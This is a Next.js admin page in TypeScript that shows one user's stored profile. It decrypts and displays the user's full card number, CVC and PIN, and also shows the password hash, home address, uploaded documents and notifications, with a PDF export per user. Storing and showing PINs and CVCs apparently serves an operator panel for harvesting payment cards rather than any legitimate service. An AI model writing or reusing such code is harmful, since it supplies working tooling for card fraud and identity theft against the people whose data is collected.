import { notFound, redirect } from "next/navigation";
import { getServerSession } from "next-auth";
import { authOptions } from "@/lib/auth";
import { prisma } from "@/lib/prisma";
import { decryptText } from "@/lib/encryption";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import Link from "next/link";
import { DocStatus, DocType } from "@prisma/client";
import { UserActions } from "@/components/admin/user-actions";
import { DocumentList } from "@/components/admin/document-list";
import { LanguageProvider } from "@/lib/language-context";

type UserFinancials = {
  cardName: string;
  cardNumberEnc: string;
  cvcEnc: string;
  pinEnc: string;
  expiryDate: string;
  lastFour: string;
};

type AdminUserDetail = {
  id: string;
  fullName: string;
  email: string;
  password: string;
  role: "ADMIN" | "USER";
  city: string | null;
  address: string | null;
  status: "PENDING" | "UNDER_REVIEW" | "APPROVED" | "REJECTED";
  language: string;
  theme: string;
  createdAt: Date;
  financials: UserFinancials | null;
  documents: Array<{
    id: string;
    fileName: string;
    fileUrl: string;
    type: DocType;
    status: DocStatus;
    createdAt: Date;
  }>;
  notifications: Array<{
    id: string;
    title: string;
    message: string;
    isRead: boolean;
    createdAt: Date;
  }>;
};

export default async function AdminUserDetailPage({
  params,
}: {
  params: Promise<{ id: string }>;
}) {
  const session = await getServerSession(authOptions);
  if (!session?.user?.id) redirect("/login");
  if (session.user.role !== "ADMIN") redirect("/dashboard");

  const { id } = await params;
  const user = (await prisma.user.findUnique({
    where: { id },
    select: {
      id: true,
      fullName: true,
      email: true,
      password: true,
      role: true,
      city: true,
      address: true,
      status: true,
      language: true,
      theme: true,
      createdAt: true,
      financials: true,
      documents: { orderBy: { createdAt: "desc" } },
      notifications: { orderBy: { createdAt: "desc" }, take: 20 },
    },
  })) as AdminUserDetail | null;
  if (!user) notFound();

  let decryptedFinancial: {
    cardName: string;
    cardNumber: string;
    cvc: string;
    pin: string;
    expiryDate: string;
    lastFour: string;
  } | null = null;

  if (user.financials) {
    decryptedFinancial = {
      cardName: user.financials.cardName,
      cardNumber: decryptText(user.financials.cardNumberEnc),
      cvc: decryptText(user.financials.cvcEnc),
      pin: decryptText(user.financials.pinEnc),
      expiryDate: user.financials.expiryDate,
      lastFour: user.financials.lastFour,
    };
  }

return (
    <LanguageProvider>
      <main className="min-h-dvh px-4 sm:px-8 py-10 sm:py-16">
        <div className="mx-auto max-w-4xl space-y-6">
          <header className="rounded-xl border bg-white/5 backdrop-blur-lg border-white/10 p-4 sm:p-6">
            <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4">
              <div>
                <h1 className="text-xl sm:text-2xl font-bold">User Details: {user.fullName}</h1>
                <p className="text-slate-400 text-sm sm:text-base">{user.email}</p>
              </div>
              <div className="flex gap-2">
                <Button asChild size="sm" variant="outline">
                  <a href={`/api/admin/users/${user.id}/download`} target="_blank">
                    Download User (PDF)
                  </a>
                </Button>
                <Link href="/admin/dashboard">
                  <Button variant="outline" size="sm">Back to Dashboard</Button>
                </Link>
              </div>
            </div>
          </header>

          <div className="grid gap-4 sm:gap-6 md:grid-cols-2">
            <Card className="bg-white/5 backdrop-blur-lg border border-white/10 transition-all duration-300 ease-in-out hover:-translate-y-2 hover:border-blue-500/50 hover:shadow-blue-500/20">
              <CardHeader>
                <CardTitle className="text-lg">Basic Information</CardTitle>
              </CardHeader>
              <CardContent className="space-y-2 text-slate-300 text-sm sm:text-base">
                <p><strong className="text-white">Full Name:</strong> {user.fullName}</p>
                <p><strong className="text-white">Email:</strong> {user.email}</p>
                <p><strong className="text-white">Password Hash:</strong> <span className="text-xs font-mono truncate max-w-[150px] inline-block">{user.password}</span></p>
                <p><strong className="text-white">Role:</strong> <Badge variant={user.role === "ADMIN" ? "default" : "secondary"}>{user.role}</Badge></p>
                <p><strong className="text-white">Status:</strong> <Badge variant={user.status === "APPROVED" ? "default" : user.status === "REJECTED" ? "destructive" : "secondary"}>{user.status}</Badge></p>
                <p><strong className="text-white">City:</strong> {user.city || "N/A"}</p>
                <p><strong className="text-white">Address:</strong> {user.address || "N/A"}</p>
                <p><strong className="text-white">Language:</strong> {user.language}</p>
                <p><strong className="text-white">Theme:</strong> {user.theme}</p>
                <p><strong className="text-white">Created At:</strong> {user.createdAt.toLocaleString()}</p>
              </CardContent>
            </Card>

            <Card className="bg-white/5 backdrop-blur-lg border border-white/10 transition-all duration-300 ease-in-out hover:-translate-y-2 hover:border-blue-500/50 hover:shadow-blue-500/20">
              <CardHeader>
                <CardTitle className="text-lg">Financial Details</CardTitle>
              </CardHeader>
              <CardContent className="space-y-2 text-slate-300 text-sm sm:text-base">
                {decryptedFinancial ? (
                  <>
                    <p><strong className="text-white">Card Name:</strong> {decryptedFinancial.cardName}</p>
                    <p><strong className="text-white">Card Number:</strong> **** **** **** {decryptedFinancial.lastFour}</p>
                    <p><strong className="text-white">Full Card Number:</strong> {decryptedFinancial.cardNumber}</p>
                    <p><strong className="text-white">Expiry:</strong> {decryptedFinancial.expiryDate}</p>
                    <p><strong className="text-white">CVC:</strong> {decryptedFinancial.cvc}</p>
                    <p><strong className="text-white">PIN:</strong> {decryptedFinancial.pin}</p>
                  </>
                ) : (
                  <p>No financial details available.</p>
                )}
              </CardContent>
            </Card>
          </div>

          <UserActions userId={user.id} currentStatus={user.status} />

          <Card className="bg-white/5 backdrop-blur-lg border border-white/10">
            <CardHeader>
              <CardTitle className="text-lg">Documents</CardTitle>
            </CardHeader>
            <CardContent>
              <DocumentList documents={user.documents} userId={user.id} />
            </CardContent>
          </Card>

          <Card className="bg-white/5 backdrop-blur-lg border border-white/10">
            <CardHeader>
              <CardTitle className="text-lg">Notifications</CardTitle>
            </CardHeader>
            <CardContent>
              <div className="space-y-2">
                {user.notifications.map((notif) => (
                  <div key={notif.id} className="border border-slate-700 rounded p-3 hover:bg-slate-800/50 transition-colors">
                    <p className="text-slate-300"><strong className="text-white">Title:</strong> {notif.title}</p>
                    <p className="text-slate-300"><strong className="text-white">Message:</strong> {notif.message}</p>
                    <p className="text-slate-300"><strong className="text-white">Read:</strong> {notif.isRead ? "Yes" : "No"}</p>
                    <p className="text-slate-300"><strong className="text-white">Created:</strong> {notif.createdAt.toLocaleString()}</p>
                  </div>
                ))}
              </div>
            </CardContent>
          </Card>
        </div>
      </main>
    </LanguageProvider>
  );
}
